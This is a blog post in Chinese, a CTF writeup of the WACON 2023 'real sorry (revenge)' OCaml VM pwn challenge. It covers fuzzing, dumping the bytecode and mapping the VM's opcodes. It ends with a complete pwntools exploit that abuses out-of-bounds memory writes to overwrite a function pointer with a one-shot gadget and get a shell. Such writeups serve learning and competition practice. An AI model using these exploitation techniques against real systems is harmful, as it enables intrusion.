---
date: 2024-7-24 21:22:03
layout: post
title: A gift to Rosa a year ago
subtitle: WACON quals 2023 real sorry(revenge) vm
description: >-
  一年前看师兄们做这道题，感觉惊为天人。一年后自己按图索骥做出来了
image: >-
  /assets/img/uploads/getshell.png
optimized_image: >-
  /assets/img/uploads/getshell.png
category: ctf
tags:
  - pwn
  - ctf
  - 虚拟机题
  - real sorry (revenge)
  - writeup (wp)
author: rosayxy
paginate: true
---
# A gift to Rosa a year ago -- WACON quals 2023 real sorry(revenge) vm writeup
## 题目
题目链接镇楼：https://github.com/sajjadium/ctf-archives/tree/main/ctfs/WACON/2023/Quals/pwn/real_sorry_revenge     
题目本身是一个 OCaml 的虚拟机，你输入 bytecode 之后会返回给你解析后的值
## fuzz
由于main 里面也有一大堆函数，不是很想逆向，就打算先跑个 fuzz 试一下，然后，因为没有逆向，所以连 EBNF 文法都得不到，没办法用 nautilus，就直接用了 AFL++ 的 qemu-mode (注意如果是第一次用 AFL++ 的 qemu mode 的话，需要把它里面检测是否有 afl-gcc 插装痕迹的那一小段代码注释掉再编译一遍 AFL++ qemu mode，不然 AFL++ 会直接 abort 掉 ~)。seed 就选取它题目中的` b'Please enter the byte sequence (e.g., \\x01\\x02\\x03):\n'` "e.g" 后面的内容，因为可以被正常解析      
比较幸运，第一次就比较好的探索了挺多路径，不到4分钟就出了第一个 crash , 然后中间手贱 abort 掉了，再次 fuzz 的时候发现一直探索不到新的路径，再多fuzz了几次，每次是 如果5分钟的时候还是停留在第一阶段就ctrl+C 停掉，又出现了一次 crash 较多的情况。*补充一小点软件分析的观察：虽然感觉现在 fuzz 比符号执行这些静态方法用的多一些，但是像这种例子就直观看到了动态方法的一些局限性，比如依赖于 seed,天生就具有很多漏报之类的情况。*查看 stack backtrace 发现 crash 的点是 libstorage.so 里面的 get_memory,set_memory，都没有对数组下标的检查，所以容易越界       
## PoC to Exp
### trial and error
有了 PoC 之后，尝试像调程序一样，得到一个最小的 crashcase, 最终得到以下两个例子：
![alt_text](/assets/img/uploads/crash1.png)

![alt_text](/assets/img/uploads/crash2.png)

然后尝试对着这两个输入上 gdb 去调，但是发现执行的指令太多了，就是那种输入只有六个字节，但是打了一堆断点，调了将近一个小时都到不了 crash point 这种，而且主要也还是在如下的 jumptable 里面绕来绕去（srds 这个jumptable 看上去就很虚拟机题哈哈哈哈哈），不知道为什么就调到一个PUSH,然后就s了几下就到一个 CALL2 之类的，让人非常疑惑   
![alt_text](/assets/img/uploads/jmptable.png)

![alt_text](/assets/img/uploads/entry.png)

看这个entry，就想到了当时去哈工大比赛的时候的那道逆向题，也是这样一小段 IDA 反编译不出来的汇编当作一个 opcode 来使，后来发现确实也是这样   
### 破局：CamlDumpObj
这个时候，我以为题目的设计是，我的比如说两个字节对应一个常规虚拟机的指令，但是这个指令对应程序运行过程中不知道哪个内存地址的又一串序列指令，它在执行的时候执行内部写好的那一串指令这样的，但是怎么提取到这串指令就是一个问题，感觉调试的工作量多少有点太大了   
不知道怎么做的时候就看了当时的 Discord 子区，发现当时 elsa 可以 dump 出来 OCaml bytecode，用类似于“caml dump bytecode from executable” 的关键字 google 了一下，看到了下面的回答：https://stackoverflow.com/questions/15183701/decompiling-ocaml-byte-code-files    
而且当时 elsa 学长 还在子区发了一份这样格式的文件：
![alt_text](/assets/img/uploads/bytecode.png)
和那个 stack_overflow 上 dumpobj 的回答中的格式特别像是不是！    
于是果断配了 OCaml 的环境，用 ocamldumpobj 直接对 app 跑了一下，果然得到了格式一样的文件，特别开心！
### extract ops from bytecode
接上面，提取到的 instructions 如下图所示
![alt_text](/assets/img/uploads/opcodes.png)   
看到这个的时候就感觉是可以执行的指令序列呀，现在看起来也会想到三地址码，感觉比较像hhh   
但是这个dump 出来的指令有两万多行，是人和 gpt 都不太能处理的程度，而且比如说在它的提示输出之前就有一堆指令指令，感觉可能无关指令会比较多，此时尝试找 caml bytecode 的 decompiler 但是基本没找到啥，，   
但是发现和我们 fuzz 得到的两个 vuln func set_memory,get_memory 相关的 instruction 只是各有四条左右，而且相隔很近，按照看汇编代码的习惯，在那一处左右的 instuction 进行基本块的划分，便能看出来**第二层虚拟机**，belike
```
34623  SWITCH 
        int 0 -> 34643  // set_reg 0
        int 1 -> 34651  // get_reg 1
        int 2 -> 34657  // add 2
        int 3 -> 34672  // add_and_set 3
        int 4 -> 34691  // sub 4
        int 5 -> 34706  // sub and set 5
        int 6 -> 34725  // mul 6
        int 7 -> 34740  // mul_and_set 7
        int 8 -> 34759  // get_reg_mem 8
        int 9 -> 34770  // get_mem 9
        int 10 -> 34776 // load 0xa
        int 11 -> 34791 // dir_load 0xb
        int 12 -> 34803 // dir_store 0xc
        int 13 -> 34811 // set_mem 0xd
        int 14 -> 34824 // set_mem_indir 0xe
        int 15 -> 34840 // syscall 0xf
        int 16 -> 34845 // mov 0x10
        int 17 -> 34858 // set_mem4 0x11
   34643  ACC1
   34644  GETFIELD2
   34645  PUSHACC2
   34646  GETFIELD1
   34647  C_CALL2 set_register
   34649  BRANCH 34871          //set_reg

   34651  ACC1
   34652  GETFIELD1
   34653  C_CALL1 get_register
   34655  BRANCH 34871            // get_reg

   34657  ACC1
   34658  GETFIELD1
   34659  C_CALL1 get_register
   34661  PUSHACC2
   34662  GETFIELD2
   34663  C_CALL1 get_register
   34665  PUSHACC0
   34666  PUSHACC2
   34667  ADDINT
   34668  POP 2
   34670  BRANCH 34871    // add

   34672  ACC1
   34673  GETFIELD1
   34674  C_CALL1 get_register
   34676  PUSHACC2
   34677  GETFIELD2
   34678  C_CALL1 get_register
   34680  PUSHACC0
   34681  PUSHACC2
   34682  ADDINT
   34683  PUSHACC0
   34684  PUSHCONST0
   34685  C_CALL2 set_register
   34687  POP 3
   34689  BRANCH 34871           // add and set

   34691  ACC1
   34692  GETFIELD1
   34693  C_CALL1 get_register
   34695  PUSHACC2
   34696  GETFIELD2
   34697  C_CALL1 get_register
   34699  PUSHACC0
   34700  PUSHACC2
   34701  SUBINT
   34702  POP 2
   34704  BRANCH 34871              // sub

   34706  ACC1
   34707  GETFIELD1
   34708  C_CALL1 get_register
   34710  PUSHACC2
   34711  GETFIELD2
   34712  C_CALL1 get_register
   34714  PUSHACC0
   34715  PUSHACC2
   34716  SUBINT
   34717  PUSHACC0
   34718  PUSHCONST0
   34719  C_CALL2 set_register
   34721  POP 3
   34723  BRANCH 34871        // sub and set

   34725  ACC1
   34726  GETFIELD1
   34727  C_CALL1 get_register
   34729  PUSHACC2
   34730  GETFIELD2
   34731  C_CALL1 get_register
   34733  PUSHACC0
   34734  PUSHACC2
   34735  MULINT
   34736  POP 2
   34738  BRANCH 34871       // mul

   34740  ACC1
   34741  GETFIELD1
   34742  C_CALL1 get_register
   34744  PUSHACC2
   34745  GETFIELD2
   34746  C_CALL1 get_register
   34748  PUSHACC0
   34749  PUSHACC2
   34750  MULINT
   34751  PUSHACC0
   34752  PUSHCONST0
   34753  C_CALL2 set_register
   34755  POP 3
   34757  BRANCH 34871           // mul_and_set

   34759  ACC1
   34760  GETFIELD1
   34761  C_CALL1 get_register
   34763  PUSHACC0
   34764  C_CALL1 get_memory
   34766  POP 1
   34768  BRANCH 34871        //get_reg_mem

   34770  ACC1                //get_mem
   34771  GETFIELD1
   34772  C_CALL1 get_memory
   34774  BRANCH 34871

   34776  ACC1
   34777  GETFIELD1
   34778  C_CALL1 get_register
   34780  PUSHACC0
   34781  C_CALL1 get_memory // 是一个 libc 地址
   34783  PUSHACC0
   34784  PUSHCONST0
   34785  C_CALL2 set_register // load 写的这个数*2+1可以变成一个 libc 地址
   34787  POP 2
   34789  BRANCH 34871

   34791  ACC1
   34792  GETFIELD1
   34793  C_CALL1 get_memory
   34795  PUSHACC0
   34796  PUSHCONST0
   34797  C_CALL2 set_register
   34799  POP 1
   34801  BRANCH 34871   // dir_load

   34803  ACC1
   34804  GETFIELD2
   34805  PUSHACC2
   34806  GETFIELD1
   34807  C_CALL2 set_memory
   34809  BRANCH 34871  // dir_store

   34811  ACC1
   34812  GETFIELD2
   34813  C_CALL1 get_register
   34815  PUSHACC0
   34816  PUSHACC3
   34817  GETFIELD1
   34818  C_CALL2 set_memory
   34820  POP 1
   34822  BRANCH 34871         // set_mem

   34824  ACC1
   34825  GETFIELD1
   34826  C_CALL1 get_register
   34828  PUSHACC2
   34829  GETFIELD2
   34830  C_CALL1 get_register
   34832  PUSHACC0
   34833  PUSHACC2
   34834  C_CALL2 set_memory
   34836  POP 2
   34838  BRANCH 34871         // set_mem_indir

   34840  CONST0
   34841  C_CALL1 syscall
   34843  BRANCH 34871      // syscall

   34845  ACC1
   34846  GETFIELD2
   34847  C_CALL1 get_register
   34849  PUSHACC0
   34850  PUSHACC3
   34851  GETFIELD1
   34852  C_CALL2 set_register
   34854  POP 1
   34856  BRANCH 34871    // mov

   34858  ACC1
   34859  GETFIELD1
   34860  C_CALL1 get_register
   34862  PUSHACC2
   34863  GETFIELD2
   34864  PUSHACC1
   34865  C_CALL2 set_memory
   34867  POP 1
   34869  BRANCH 34871      // set_mem4

   34871  POP 1
   34873  PUSHGETGLOBAL <0>(<11>("  result : ", <4>(0, 0, 0, <12>(10, 0))), "  result : %d\n")
   34875  PUSHGETGLOBALFIELD Stdlib__Printf, 1
   34878  APPTERM2 3
   34880  CONST2
   34881  PUSHACC1
   34882  OFFSETINT -1
   34884  DIVINT
   34885  RETURN 1
```
由我们 crashcase 可以看到它最后的 RETURN 1 其实不是完全返回，而是执行一堆之后再次回到那个 switch 语句，就比较圆满 ~    
具体的 opcode 的对应关系已经在上面标出来啦 ~ 还有一个小的点就是它所有指令都是3字节，这个调试可以得到，比较简单   
### hack
思路比较简单，注意到以下三点：
- 它 libstorage.so 和 libc 之类的偏移都是一定的，然后调试 crash1（第一张图）的 case 的时候就注意到了它会把一个 libc 固定偏移的地址的一半塞到一个寄存器里面，并且我们有set_reg,mul_and_set，add_and_set 这些函数,所以就可以直接自力更生  
- 它进行 CALL2 CALL1 的时候都是访问堆上的一堆函数指针，然后这些函数指针都是从0x051CE0 地址上 caml_builtin_cprim 直接拷贝过去的，而且我们 set_memory 可以溢出的地址比这些函数指针地址低   
所以我们采用如下方法：
- 先把一个 libc 地址塞到一个寄存器里面，把它 libstorage 里面的后门函数 oneshot 通过寄存器加减造出来
- 然后我们通过 set_memory 溢出，调用那个 set_mem_indir 覆盖 syscall 函数指针为 one_shot

其他注意点：
- 每次输出 opcode 的时候都是比如说原本寄存器中值减一除以二     
- set_register,set_memory 的时候设置的值会减一除以二，set_memory 的时候，下标如果按照 QWORD ptr 算的话也是会除以2（轩哥锐评：嗷嗷嗷 那个操作一下 数据就没一半的那个是吧，挺有毒的hh）
- 把数凑好就差不多打出来了hhh,其实打完看思路挺清楚的 ~

## 总结
是至少2层的虚拟机题呀，感觉还是挺考虑综合能力的，比如说跑 fuzz，找到 CamlDumpObj 这个工具这样的 ~ （Elsa tql!!）  
对于 rosa 来说 不用打 IOFile 减少了脑壳疼的程度（非实指）   
还记得去年打题的时候，轩哥，雅儒学长，elsa 开了六个小时的腾讯会议连麦，当时有幸蹭了一波（甚至记得当时我在深圳的家里做题，穿了一件粉色的有小兔子的睡衣hhh），真的人生体验，看师傅们打题真的惊为天人，感觉自己在这么短的时间内应该是做不出来的ww，感觉大家好厉害ww，现在自己做的时候虽然比想象中简单，但是像是上面的综合能力，感觉自己还有挺大的提升空间    
今年在北京造编译器和嗑盐的间隙摸鱼做题hhh，在下雨的晚上待在宿舍中厅，同时好队友 k4ra5u 在出题 http pwn，感觉好快乐好满足ww    
最后如果有没讲细的地方请通过邮箱联系ww，联系方式在博客主页，谢谢大家阅读 ~

## exp
请忽略注释里面 rosa 的碎碎念（
```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p=process("./app")
# todo figure out what does push_acc0,get_field const0 does, const0 看上去是1的样子
def set_reg(i,val):
    return b"\x00"+p8(i)+p8(val)
def get_reg(i,j):
    return b"\x01"+p8(i)+p8(j)
def add(i,j):
    return b"\x02"+p8(i)+p8(j)

def add_and_set(i,j):
    return b"\x03"+p8(i)+p8(j)

def sub_and_set(i,j):
    return b"\x05"+p8(i)+p8(j)
def get_reg_mem(i,j): # 不知道 j 有啥用
    return b"\x08"+p8(i)

def get_mem(i,j):
    return b"\x09"+p8(i)
def load(i,j):
    return b"\x0a"+p8(i)+p8(j) # 虽然但是感觉好像只和i有关系
def dir_load(i,j):
    return b"\x0b"+p8(i)+p8(j)
def store(i,j):
    return b"\x0c"+p8(i)+p8(j)
def set_mem(i,j):
    return b"\x0d"+p8(i)+p8(j)
def set_mem_indir(i,j):
    return b"\x0e"+p8(i)+p8(j)
def syscall():
    return b"\x0f\x00\x00"
def mov(i,j):
    return b"\x10"+p8(i)+p8(j)
def set_mem4(i,j):
    return b"\x11"+p8(i)+p8(j)
def mul_and_set(i,j):
    return b"\x07"+p8(i)+p8(j)
def real_add(i,num,num2reg):
    return set_reg(num2reg,num)+add(i,num2reg)+mul_and_set(0,15)+mov(num2reg,0)
def real_sub(i,num,num2reg):
    return set_reg(7,0x10)+set_reg(num2reg,num)+sub_and_set(i,num2reg)+mul_and_set(0,7)+mov(num2reg,0)
# leak
# oneshot: libstorage + 0x9fa0 (libc 和 libstorage 偏移固定的)
# 思路：CALL_1 CALL_2 这些用的那个 prim_table 在堆上，所以可以靠改函数指针的方法
# 先把 one_shot_addr*2+1 之类的东西放到一个寄存器里面，然后去把 (offset+1)*2 之类的存一个寄存器里面再调用 set_mem_indir 去写 syscall 指针
# 0x564951ec0da0：一堆函数指针 0x0000564951ebefa0：我们溢出的buffer
# gdb attach 上看偏移 reg0:0x7f933c3ee36a one_shot: 0x7f933c4f7fa0
# 堆偏移 0x556209a26a58（syscall） 0x556209a23fa0
#gdb.attach(p)
heap_offset=0x557
offset=0x109c34 # 16*0x109c3 不确定在 mov8 之后是不是真的 offset
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p.recvuntil(":\n")
s=load(17,0)+set_reg(2,0x10)+mul_and_set(0,2)+get_reg(0,0)+mov(8,0)+set_reg(15,0x8) # 到这里的时候 reg0 是一个 libc 地址
# 凑 0x109c3
s+=set_reg(2,0x20)+set_reg(3,0xff)+set_reg(4,0xff)+mul_and_set(3,4)+mul_and_set(0,2)+mov(9,0)+set_reg(6,0x6f)+mul_and_set(6,3)+set_reg(7,0x48)+add_and_set(0,7)+add_and_set(0,9)+mul_and_set(0,15) # 下来是0x109dc 左右
s+=set_reg(3,0x80)+mul_and_set(3,0) # 得到一个 0x109c40*2 之类的数
s+=mov(4,0)+add_and_set(8,4)+mul_and_set(0,2)+mov(14,0)+get_reg(14,0)+real_sub(14,14,13) # 再调一下 感觉差不多是两倍 oneshot 的地址了，这个数//2再减7就是了 todo 改成28
# 凑堆上偏移
s+=set_reg(3,0xff)+set_reg(4,0x2a)+mul_and_set(3,4)+set_reg(5,0x48)+add_and_set(0,5)+get_reg(0,0) # 现在大概是 0x558 吧
s+=mul_and_set(0,15)+set_mem_indir(0,13)+syscall()
p.send(s)
p.interactive()
```